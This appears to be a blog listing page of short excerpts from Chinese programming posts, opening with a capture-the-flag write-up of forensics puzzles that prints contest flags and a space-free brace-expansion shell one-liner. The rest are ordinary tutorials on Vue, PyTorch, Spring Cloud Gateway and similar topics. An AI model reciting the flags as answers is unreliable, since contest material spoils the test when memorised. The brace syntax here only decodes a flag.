<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b123c4efe7f131bc0149f2a4a44b4fb/" rel="bookmark">
			2020上海大学生网络安全赛MISC题WP
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2020上海大学生网络安全赛MISC题WP 前言MISC 可乐加冰MISC pcap analysisMISC pcapMISC 签到 前言 昨天参加了上海大学生网络安全赛，MISC题全部AK，Web题就做出一道。我果然够菜，都不好意思说自己是学Web的。
最让我记忆尤新的是我竟然拿了MISC 可乐加冰的一血，学PWN的队友chumen77也拿了一个PWN题的一血(可能是大师傅们都去打湖湘线下和西湖线下的原因)。最后还剩10分钟左右时，还在前20名。最后10分钟连掉了7、8个名次，最终应该去不了线下了，我们真菜。。。。。
这里就先总结一下MISC题，Web题目总结和复现另起一篇总结：
MISC 可乐加冰 考点：zlib块解压+十进制转字符串+替换S为$+JJENCODE解码
下载题目并解压，是一张png图片。使用binwalk分析
发现里面包含了两个Zlib 压缩数据包。使用binwalk -e data.png提取出来zlib 压缩数据包
提取出来的文件中，发现5B和5B.zlib看着比较正常。而2AE96的内容比较可疑。
2AE96.zlib是压缩的zlib块，2AE96是解压后的zlib块。
用winhex打开2AE96，发现16进制显示区域，似乎都是10进制数值
复制出来
834636363695438346369595364383469595954383469595364383463636363643834636363695438346369595364383469595364334453443834636953636438346369536954383463636953643834636369543344534438346369595438346369536954383463636363643834636363643344534438346369595364383463695953643834636369543834695363643344534438346363695364383463695369543834636369536438346369595954383469595364383469536954383463636363643834636953643834636369543834695369543834636959543834636369536
每两个数值间加空格，然后转字符串
发现，转换出来的字符串比较像JJENCODE编码
不过没有S，于是把所有的S替换成$，进行JJENCODE解码，得到flag：
也可以直接在浏览器的控制台进行解码，不过要控制台中把上面这串密文加到alert();的jjencode密文后面或者直接放在在alert();里面
MISC pcap analysis 考点：流量分析+Modbus协议
题目提示让分析Modbus协议
筛选Modbus协议，随便追踪其中一个包的TCP流，即可发现flag
整理后得到flag值：flag{323f986d429a689d3b96ad12dc5cbc701db0af55}
MISC pcap 考点：流量分析+dnp3协议
题目提示让分析Modbus协议
首先，筛选出dnp3的流量，然后查看每个数据包，发现
在Counter（32 bit）选项上对应着一个数值102转换成字符就是f，并且该数据包长度为91。于是接下来按照数据包长度进行排序，并找到数据包长度为91的
发现数据包长度为91的，每个数据包里都有一个数值并对应有相应字符，按照顺序依次是f、l、a….
查看完所有长度为91的数据包，按照顺序放在一起，得到最终flag。
最后得到flag值：flag{d989e2b92ea671f5d30efb8956eab1427625c}
MISC 签到 直接将题目给的一串命令：
{echo,ZmxhZ3t3MzFjMG1lNX0=}|{base64,-d}|{tr,5,6} 在linux上执行，得到flag
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/30c1fde6749015cbaa62396f6ddcca53/" rel="bookmark">
			计算机中数据的存储和排列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、数据的存储方式1、大端存储模式2、小端存储模式 二、数据的排列方式1.边界对齐2.边界不对齐 总结 一、数据的存储方式 在计算机系统中，数据是以字节为单位的，每一个地址单元都对应着一个字节，一个字节为8bit，而且多字节的数据在内存里一定是占连续的几个字节的，这就意味着位数大于8位的处理器，由于寄存器宽度大于一个字节，就变存在着多个字节的安排问题。因此就导致了大端存储模式和小端存储模式。
1、大端存储模式 图解：
对于一个4字节的int类型：大端模式是指数据的高字节，保存在内存的低地址中，而数据的低字节，保存在内存的高地址中，这样的存储模式有点儿类似于把数据当作字符串顺序处理：地址由小向大增加，而数据从高位往低位放；
即：在内存地址递增的方向上，数据由高位到低位的形式存储。
2、小端存储模式 图解：
同样对于一个4字节的int类型：小端模式是指数据的高字节保存在内存的高地址中，而数据的低字节保存在内存的低地址中。
即：在内存地址递增的方向上，数据由低位到高位的形式存储。
很显然，就读写方式来看，大端的存储模式肯定是更符合人们的阅读的，那为什么还需要小端储存模式呢？
那是因为小端存储模式将地址的高低和数据位权有效地结合起来，高地址部分权值高，低地址部分权值低，和我们的逻辑方法一致。
举个栗子：假如我们的CPU每一次只能处理一个8位的二进制运算，这个时候要计算2个int类型的加法运算，那么计算机首先要计算的应该是最低位的8位数据，再到次低位，直到计算完毕。而这种小端的存储模式是更符合计算机的处理的！
二、数据的排列方式 现代计算机通常都是以字字节编址的，也就是说一个字节对应一个地址。
当然也可以按照字、半字、字节寻址。
1.边界对齐 2.边界不对齐 以一个存储字长为32位、每次访存只能读写一个字的CPU为例！
1字节 = 8bit 存储字长 = 32bit，即1字 = 32bit，半字 = 16bit。 按字节寻址：假如要寻找编号地址为2的字节，就是图中的字节3 按半字寻址：假如要寻找编号地址为3的半字 0号半字 ： 字节1 + 字节2 1号半字 ： 字节3 + --- 2号半字 ： 半字1 3号半字 ： 半字2 所以编号地址为3的半字就是半字2所在位置 按字寻址：假如要寻找编号地址为2的字 0号字：字节1 + 字节2 + 字节3 + --- 1号字：半字1 + 半字2 2号字：半字3 + --- 所以编号地址为2的字就是 半字3起始位置 到 ---结束位置 同样的边界不对齐方式也是如此！这里不再一一展开!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/30c1fde6749015cbaa62396f6ddcca53/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9dac1c805400edc242f35e70070df58c/" rel="bookmark">
			VirtualBox：NS_ERROR_FAILURE (0x80004005)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		VirtualBox：NS_ERROR_FAILURE (0x80004005) 环境：macOS11.0.1
1. 前言 macOS10.15.7升级最新的11.0.1过后，使用Vagrant创建CentOS7虚拟机启动提示如下错误。
You're running an up-to-date version of Vagrant! yimt@MacBook-Pro centos7-docker % vagrant up Bringing machine 'default' up with 'virtualbox' provider... ==&gt; default: Clearing any previously set forwarded ports... ==&gt; default: Clearing any previously set network interfaces... ==&gt; default: Preparing network interfaces based on configuration... default: Adapter 1: nat ==&gt; default: Forwarding ports... default: 22 (guest) =&gt; 2222 (host) (adapter 1) ==&gt; default: Booting VM... There was an error while executing `VBoxManage`, a CLI used by Vagrant for controlling VirtualBox.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9dac1c805400edc242f35e70070df58c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5497731f09e199309028c878cd998e71/" rel="bookmark">
			全国历史天气查询/历史天气预报查询——全国各月份数据爬取
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		全国历史天气查询/历史天气预报查询——全国各月份数据爬取 效果 图1 目标爬取数据 图2 最终实验效果 实验效果：最终可将官网已有的数据进行爬取整理，共363个城市，从2011年1月——至今
数据已上传至CSDN，若无C币的小伙伴可以自行爬取或至QQ群：782589269，群文件中免费下载使用
目录 全国历史天气查询/历史天气预报查询——全国各月份数据爬取效果导入所需库分析官网HTML内容使用正则抽取所需的城市名信息爬取全部的城市名与链接保存城市名与基链接各城市的月份数据爬取 全国历史天气查询_历史天气预报查询_温度查询_天气后报官网，戳它直达！
导入所需库 import os import re import time import pandas as pd from tqdm import tqdm import pickle import requests 分析官网HTML内容 首先，进行官网HTML内容的分析，找出我们所需信息的代码段
官网链接：http://www.tianqihoubao.com/lishi/
url = "http://www.tianqihoubao.com/lishi/" url_request = requests.get(url) url_request.encoding = 'gb2312' url_text = url_request.text print(url_text) 可以看出我们要爬取的城市名在，诸如这样的&lt;a&gt;城市名&lt;/a&gt;代码块
&lt;a href="/lishi/bj.htm" title=“北京历史天气预报”&gt;&lt;b&gt;北京&lt;/b&gt;&lt;/a&gt;
使用正则抽取所需的城市名信息 若不懂正则表达式，在此，你只需了解在正则表达式中可以用(\w+)来提取所需内容即可
比如对于上例中的链接，将其中的‘北京’换成(\w+)即可，对于各城市相同的部分保持不变，各城市不同的部分使用正则表达式替换，不加括号代表不提取，即\w+
因此，可以得到下述pattern提取公式
url ='&lt;a href="/lishi/beijing.html" title="北京历史天气查询"&gt;北京 &lt;/a&gt;' pattern = '&lt;a href="/lishi/(\w+.html)" title="\w+"&gt;(\w+) &lt;/a&gt;' 实验测试
exapmle_text = '&lt;a href="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5497731f09e199309028c878cd998e71/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c98a15bbf2c65445387a820bf205f58d/" rel="bookmark">
			Vector函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、什么是vector？
向量（Vector）是一个封装了动态大小数组的顺序容器（Sequence Container）。跟任意其它类型容器一样，它能够存放各种类型的对象。可以简单的认为，向量是一个能够存放任意类型的动态数组。
二、容器特性
1.顺序序列
顺序容器中的元素按照严格的线性顺序排序。可以通过元素在序列中的位置访问对应的元素。
2.动态数组
支持对序列中的任意元素进行快速直接访问，甚至可以通过指针算述进行该操作。操供了在序列末尾相对快速地添加/删除元素的操作。
3.能够感知内存分配器的（Allocator-aware）
容器使用一个内存分配器对象来动态地处理它的存储需求。
三、基本函数实现
1.构造函数
vector():创建一个空vector
vector(int nSize):创建一个vector,元素个数为nSize
vector(int nSize,const t&amp; t):创建一个vector，元素个数为nSize,且值均为t
vector(const vector&amp;):复制构造函数
vector(begin,end):复制[begin,end)区间内另一个数组的元素到vector中
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae2a4898f188131df8f3b965cdc804db/" rel="bookmark">
			matlab相关性分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		相关性分析 一、皮尔逊相关系数 （person）
计算公式
样本协方差： C o v ( x , y ) = ∑ i = 1 n ( X i − X ˉ ) ( Y i − Y ˉ ) n − 1 {Cov(x,y)=\frac{\sum_{i=1}^n(X_i-\bar{X})(Y_i-\bar{Y})}{n-1}} Cov(x,y)=n−1∑i=1n​(Xi​−Xˉ)(Yi​−Yˉ)​
样本标准差 S x = ∑ i = 1 n ( X i − X ˉ ) 2 n − 1 {S_x=\sqrt{\frac{\sum_{i=1}^n(X_i-\bar{X})^2}{n-1}}} Sx​=n−1∑i=1n​(Xi​−Xˉ)2​ ​
样本Person相关系数： r x y = C o v ( X , Y ) S x S y {r_{xy}=\frac{Cov(X,Y)}{S_xS_y}} rxy​=Sx​Sy​Cov(X,Y)​
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ae2a4898f188131df8f3b965cdc804db/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/becd464d16d8150582024e0321669dff/" rel="bookmark">
			逢看必会的三子棋小游戏：原来可以这么简单
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		三子棋游戏规则： 是黑白棋的一种。三子棋是一种民间传统游戏，又叫九宫棋、圈圈叉叉、一条龙、井字棋等。将正方形对角线连起来，相对两边依次摆上三个双方棋子，只要将自己的三个棋子走成一条线，对方就算输了。
算法思路： 打印游戏选择界面：玩家输入1开始游戏，输入0结束游戏。
定义3*3的数组，用来存放每个格子的元素。
编写函数initboard()，用来初始化每个格子中元素。
编写打印棋盘showboard()，利用循环和判断来使棋盘打印出来，如图
编写玩家移动函数playermove()，输入x，y坐标来表示想在哪个格子里下棋，‘X’表示玩家下的棋子，把‘X’赋值给对应的棋盘数组中。
编写电脑移动函数computermove()，利用rand()随机生成数字然后%3，这样就只能出现0，1，2数字，电脑下的棋为‘O’，把’O’赋值给对应的棋盘数组中。
编写判断胜利的函数iswin()，此时需要判断一方赢棋和双方和其两种情况。（1）只要每行、每列以及写对角线都为相同的元素，且不为空，则判断为一方赢棋（2）遍历数组，若棋盘放满了，则为平局。
在头文件中声明每个函数。
最后在主函数中调用对应的函数，完美运行。
最后附上代码： 头文件game.h
#ifndef __GAME_H__ #define __GAME_H__ #define ROW 3 #define COL 3 void InItBoard(char board[][COL], int row, int col); void ShowBorad(char board[][COL], int row, int col); char PlayerMove(char board[][COL], int row, int col); char ComputerMove(char board[][COL], int row, int col); char IsWin(char board[][COL], int row, int col); #endif 函数模块game.c
#define _CRT_SECURE_NO_WARNINGS 1 #include &lt;stdio.h&gt; #include "game.h" //棋盘初始化 void InItBoard(char board[][COL], int row,int col) { for (int i = 0; i &lt; row; i++) { for (int j = 0; j &lt; col; j++) { board[i][j] = ' '; } } } //显示棋盘 void ShowBorad(char board[][COL], int row, int col) { for (int i = 0; i &lt; row; i++) { for (int j = 0; j &lt; col; j++) { printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/becd464d16d8150582024e0321669dff/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/49bfa04637dbdbd419da89b5d4d896a6/" rel="bookmark">
			第十一届蓝桥杯国赛题目
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		以下是第十一届蓝桥杯国赛题目，供大家学习参考（提取码失效可以评论我）
百度云：
链接: https://pan.baidu.com/s/1g1o-px-RUVoXLLhRDS8cXQ 提取码: fgfn
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5eeac5f707cefd4c98bc292983339da/" rel="bookmark">
			vue知识点（下）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		指令v-if和v-show的使用 用于指定一个boolean值的表达式，根据表达式判断当前元素是否显示。
区别：
v-if当表达式为false时，元素直接从dom中移除。支持else
v-show当表达式为false时，仅仅是把元素设置为隐藏display：none。而没有移除元素。
v-if实例：
&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;Vue 测试&lt;/title&gt; &lt;script src="https://unpkg.com/vue/dist/vue.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="app"&gt; &lt;button @click="seen=!seen"&gt;点我&lt;/button&gt; &lt;p v-if="seen"&gt;现在你看到我了&lt;/p&gt; &lt;/div&gt; &lt;script&gt; var app = new Vue({ el: '#app', data: { seen: true } }) &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 当把seen中true变为false时，就看不到汉字了。
v-bind的使用 日标：了解v-bind语法和作用；实现点击不同按钮切换不同的属性值；使用class属性中的特殊用法实现一个按钮切换背景色
分析：
其中src和height的值如果不想写死，而是想获取vue实例中的数据属性值的话；那可以通过使用v-bind实现；
&lt;img v-bind:src="vue实例中的数据属性名" :height="vue实例中的数据属性名"/&gt; &lt;!DOCTYPE html&gt; &lt;html lang="en" xmlns:v-bind="http://www.w3.org/1999/xhtml"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;vuejs测试&lt;/title&gt; &lt;script src="vue.js"&gt;&lt;/script&gt; &lt;style type="text/css"&gt; div { width: 100px; height: 100px; color: white; } .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a5eeac5f707cefd4c98bc292983339da/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/88302ca9e32142698e604b40f81c13e7/" rel="bookmark">
			GB2312和GBK的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、收录不同：GB2312标准共收录6763个汉字，其中一级汉字3755个，二级汉字3008个；
GBK共收入21886个汉字和图形符号。
2、表示不同：GB2312对任意一个图形字符都采用两个字节表示，并对所收汉字进行了“分区”处理，每区含有94个汉字／符号，分别对应第一字节和第二字节。
GBK采用双字节表示，总体编码范围为8140-FEFE之间，首字节在81-FE之间，尾字节在40-FE之间。
3、处理功能不同：对于人名、古汉语等方面出现的罕用字，GB2312不能处理，这导致了后来GBK 及GB18030 汉字字符集的出现。
GBK: 汉字国标扩展码,基本上采用了原来GB2312-80所有的汉字及码位，并涵盖了原Unicode中所有的汉字20902，总共收录了883个符号， 21003个汉字及提供了1894个造字码位。
Microsoft简体版中文Windows 95就是以GBK为内码，又由于GBK同时也涵盖了Unicode所有CJK汉字，所以也可以和Unicode做一一对应。
GB码，全称是GB2312-80《信息交换用汉字编码字符集 基本集》，1980年发布，是中文信息处理的国家标准，在大陆及海外使用简体中文的地区（如新加坡等）是强制使用的唯一中文编码。
P-Windows3.2和苹果OS就是以GB2312为基本汉字编码， Windows 95/98则以GBK为基本汉字编码、但兼容支持GB2312。
GB码共收录6763个简体汉字、682个符号，其中汉字部分：一级字3755，以拼音排序，二级字3008，以偏旁排序。该标准的制定和应用为规范、推动中文信息化进程起了很大作用。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c28ac9aae9950768a63c091040d0702/" rel="bookmark">
			如何找出电脑里的流氓软件_电脑越用越卡，如何彻底清理干净电脑里的垃圾？...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		不知道大家有没有一种感受：电脑越用越卡，经常清理却也不见空间增加；电脑里一些文件很大，却因为看不懂名字不敢删。
今天建国就给大家分享深度清理电脑的技巧，简单方法加实用工具，小白也能快速掌握，绝对让你的电脑飞起来！
一：快速删除无用软件 别看删除软件是一件非常小的事情，可是有的时候是真心很管用，尤其是软件都下载到了系统盘里的情况下。(这里并不推荐把下载内容都存放在系统盘里)
首先，我们就要学会善用系统里的「控制面板」，调用系统里的设置，删除不需要的软件，还电脑一个清爽。
“开始”---“控制面板”---“添加删除程序”---找到想删除的程序---点卸载
如果在这里找不到，或者是遇到流氓软件卸载不掉，总是提示被占用，无法卸载，却又不知道被谁占用了，怎么办？
推荐 Geek Uninstaller，完全免费，没有广告，卸载速度快，体积小，操作简单。
可强制删除程序，可自动扫描注册表文件，最大的特点是卸载的非常干净。
它本身足够小巧，不用安装就可以直接使用，所以你可以把它存放在 U盘以备不时之需。
类似软件：CleanMyMac X(Mac用户)
二：禁止开机自启动 这一步千万不能略过！开机启动项该禁的禁，该延迟的绝不手软，要不然以后开机苦的是自己。
两种方式一种是用系统自带，一种是借助软件。
系统自带： Windows10 的用户可以直接调用后台任务管理器，(Ctrl+Shift+Esc三个按键同时按下)，点击 「启动」就可以看到开机所有的启动项。
不需要的就禁止了吧，不着急需要的就延缓启动。不过，不认识的程序还是放着别动比较好。
Windows10 以下的用户需要调用系统的「运行」(快捷键Win + R)输入 「msconfig」回车。
调出「系统配置菜单」， 将不需要启动的软件取消选中，点击确定按钮。
被下载25亿次的清理软件：CCleaner 被各种人安利的软件，唯一不好的是要收费。但是功能却很强大，除了开机启动项外还可以专治各种水土不服。点击查看：全球超 25 亿次下载的清理工具 , CCleaner 让你的电脑飞起来！
官方联售，限时特惠
(活动期间，每位用户仅可享受一次特价优惠)
https://www.jianguoyun.com/s/ccleanerPricing?coupon_code=c5952272-6e4c-11ea-a4aa-0017fa007e4a
只需要以 320(520)的价格，就可以获得坚果云专业版(坚果云高级专业版)+CCleaner 专业版一年(序列号一组，一年免费更新、可激活1台设备)
三：清理磁盘碎片 为什么要整理磁盘碎片？
因为文件被分散保存到整个磁盘的不同地方，而不是连续地保存在磁盘连续的簇中形成的。
硬盘在使用一段时间后，由于反复写入和删除文件，磁盘中的空闲扇区会分散到整个磁盘中不连续的物理位置上，从而使文件不能存在连续的扇区里。
这样，再读写文件时就需要到不同的地方去读取，增加了磁头的来回移动，降低了磁盘的访问速度。(百度百科)因此每个月的适当整理磁盘碎片，可以加速磁盘的访问速度。
系统自带：
打开「我的电脑」后，选择要整理的盘符，点击「右键」，在「属性」里面选择「磁盘清理」就可以了。
这时候，顺便开启 Win10 自动清理垃圾功能，让系统也能自动帮你节省空间！
依次进入 Win10「设置」→「系统」→「存储」，然后开启「储存感知功能」，就可以让 Windows 自动清理临时文件。
分析磁盘：SpaceSniffer 内存不足，但却不知道被什么东西占用了空间？
SpaceSniffer的开发者当时也遇到了这个问题，找了许多软件，发现要么收费、要么操作难，一气之下自己做了。
不需要任何学习成本，所见即所得的磁盘分析工具。
打开软件后，你会发现会它自动将文件分类并以矩形的方式呈现，文件越大，图形越大，一眼就知道谁占用了你的空间。
点击任何一个模块，就能看到详细信息，将那些不需要的大文件删除即可。例如，建国就发现微信占用的空间很大，而其中缓存的微信群图片占4个G，赶紧删除。(删除前可使用 Quicklook 快速预览下，看有没有重要内容)
以上三步基本可以甩掉电脑里的垃圾，跑的健步如飞，还不用下载各种安全卫士，你懂得。
固定的大清理固然非常重要，但是日常维护也要注意：
四：把桌面从C盘挪出 很多人习惯性地把所有文件放在桌面，桌面东西又多又杂偏偏还存在了 C 盘导致每次开机都很慢，这里再教大家一个把桌面从 C 盘挪出的方法 。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5c28ac9aae9950768a63c091040d0702/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/513c336265f483a700251ef453ce1076/" rel="bookmark">
			台式电脑怎么连接手机热点_笔记本和台式电脑没有网络怎么办？没关系，一部手机轻松搞定...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网络通信在现今社会非常重要，一台没有网络的计算机，就像一部没有网络的手机，食之无味，弃之可惜。怎么找回计算机的“灵魂”呢？
一、笔记本电脑
我们都知道，笔记本有两种上网方式：有线连接和无线连接。有线连接操作方法不再多说，主要说一下无线连接。无线连接需要笔记本周边有WIFI覆盖，有了WIFI，笔记本上网不在话下。那么笔记本周边什么都没有，只有一部手机该怎么办？解决这个问题的办法好多人都熟知，那就是【便携式WLAN热点】。
便携式WLAN热点启用方法：设置→无线和网络→移动网络共享→便携式WLAN热点→启用热点（请参考图片中的图标）。
便携式WLAN热点设置网络名称、加密类型、密码：设置→无线和网络→移动网络共享→便携式WLAN热点→配置WLAN热点。目前常用的加密类型是WPA2 PSK。配置完成后，记得点击保存。
便携式WLAN热点单次流量限制：设置→无线和网络→移动网络共享→便携式WLAN热点→单次流量限制。单次流量限制是当共享流量达到设置值，手机会自动关闭共享开关，如重新开启，流量消耗将从0开始统计。请根据自己的流量多少进行配置。
便携式WLAN已连接设备管理：设置→无线和网络→移动网络共享→便携式WLAN热点→已连接设备。点击对应设备可将其加入黑名单。
便携式WLAN热点启用完成后，打开笔记本搜索对应的WIFI网络名称，笔记本就可以上网啦！请注意：使用便携式WLAN热点，需要打开移动数据，并且会消耗数据流量，同时会消耗更多电量。
二、台式电脑
台式电脑因为没有无线网卡，只能通过有线连接，除非加装无线网卡。只要有一部手机，就可以通过USB共享网络让台式电脑上网。只需通过一根数据线，将手机与电脑连接即可，当然笔记本电脑也可以通过此方法上网。
USB共享网络启用方法：设置→无线和网络→移动网络共享→USB共享网络。
请注意：当手机与计算机连接时，USB共享网络开关才可以启用。启用USB共享网络后，等待片刻计算机就可以上网啦！当连接断开时，USB共享网络开关会变成灰色。
随着国家对电信行业的整治，曾经的流量清零已成“过往云烟”，“上网流量不清零”、“流量可转赠”、“提速降费”接踵而至，三大运营商更是推出了流量不限量业务，虽然这个不限量只是狗皮膏药，但是对于个人来说，基本能保证自需的同时，还有结余。抱着便宜谁，不能便宜移动、电信、联通的心态，总是在月末将流量清零。与其这样的操作，还不如合理规划流量的使用。学会这两个技能，不用担心流量用不完，轻松“榨干”你的流量。虽然有点夸张，但是不做防范工作的话，的确很费流量。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac97370235e8dd6c25f55f50b0584a8a/" rel="bookmark">
			SpringCloud Gateway学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SpringCloud Gateway是Spring cloud的一个全新项目，是基于Spring5.0、Spring Boot 2.0和project Reactor等技术开发的网关，它旨在为微服务架构提供一个简单有效的统一的API路由管理方式。
SrpingCloud Gateway作为spring cloud生态系统的网关，目标是替代Zuul,为了提升网关的性能，SpringCloud Gateway是基于WebFlux框架实现的，而WebFlux框架底层则使用了高性能的Reactor模式通信框架Netty.
Spring Cloud Gateway的目标是提供统一的路由方式且基于Filter链的方式提供基本的功能，如安全、监控指标和限流。
下面开始搭建gateway的微服务：
1、pom.xml中增加依赖
&lt;!--gateway--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt; &lt;/dependency&gt; 2、application.yml中增加配置：
spring: application: name: cloud-gateway cloud: gateway: routes: - id: payment_routh #路由的id #uri: http://localhost:8001 #匹配后提供服务的路由地址 uri: http://localhost:8001 #匹配后提供服务的路由地址 predicates: - Path=/payment/get/** #断言，路径匹配进行路由 - id: payment_routh2 #uri: http://localhost:8001 uri: lb://CLOUD-PAYMENT-SERVICE predicates: - Path=/payment/server/** 1）.配置中的路由规则是采用的Path Rout Predicate。官网上还支持很多，可以去看例子。https://docs.spring.io/spring-cloud-gateway/docs/2.2.5.RELEASE/reference/html/
2).uri中lb：//注册的应用名称
测试方式：1.启动eureka服务；2.启动payment8001和payment8002服务；3.访问localhost:9527/payment/server/port,可看到两个端口轮询。
3、配置中还可增加filter配置，具体见官网。
4.自定义过滤器,只需要实现GlobalFilter, Ordered两个接口，重写方法
@Component @Slf4j public class MyFilter implements GlobalFilter, Ordered { Logger logger = LoggerFactory.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ac97370235e8dd6c25f55f50b0584a8a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f0b8ef92e245b164be3eae1b022e98b2/" rel="bookmark">
			ABAP调用HTTP服务
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用类if_http_client基本可以解决大多数ABAP调用http服务的问题。在调用服务前可以先用postman来测试服务，确定可输入的参数。
postman可以设置request的方法是get还是post，也可以设置body数据的格式。
以post方式为例，request的参数都是通过body来传输的。正常服务发起比较简单，通过if_http_client-&gt;request-&gt;set_data设置传输值，if_http_client-&gt;request-&gt;set_header_field设置header的content-type。如果服务端对body的数据字符集有要求，比如gbk，则需要先将body数据进行jbk转码，然后在if_http_client-&gt;request-&gt;set_content_type中设置content-type，示例代码如下：
"设定传输请求内容格式以及编码格式 lo_http_client-&gt;request-&gt;set_content_type( content_type = 'application/XML; charset=GBK' ). "设定调用服务 lo_http_client-&gt;request-&gt;set_method( if_http_request=&gt;co_request_method_post ). CLEAR:lv_result_xstring. lv_result_xstring = cl_abap_codepage=&gt;convert_to( source = uv_reqxml codepage = 'GBK' ). lv_len = xstrlen( lv_result_xstring ). lo_http_client-&gt;request-&gt;set_data( EXPORTING data = lv_result_xstring offset = 0 length = lv_len ). lo_http_client-&gt;send( EXCEPTIONS http_communication_failure = 1 http_invalid_state = 2 ). lo_http_client-&gt;receive( EXCEPTIONS http_communication_failure = 1 http_invalid_state = 2 http_processing_failed = 3 ). * lv_result_string = lo_http_client-&gt;response-&gt;get_cdata( ). CLEAR:lv_result_xstring,lv_result_string. lv_result_xstring = lo_http_client-&gt;response-&gt;get_data( ).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f0b8ef92e245b164be3eae1b022e98b2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/704cf09a816547d2c591fc32fa817d07/" rel="bookmark">
			pytorch: tensor与numpy之间的转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		训练时，输入一般为tensor，但在计算误差时一般用numpy；tensor和numpy的转换采用numpy()和from_numpy这两个函数机型转换。值得注意的是，这两个函数所产生的tensor和numpy是共享相同内存的，而且两者之间转换很快。
import torch import numpy as np # Convert tensor to numpy a = torch.ones(3) b = a.numpy() print(a, b) a += 1 print(a, b) # Convert numpy to tensor c = np.ones(3) d = torch.from_numpy(c) print(c, d) c += 1 print(c, d) 输出为：
tensor([1., 1., 1.]) [1. 1. 1.]
tensor([2., 2., 2.]) [2. 2. 2.]
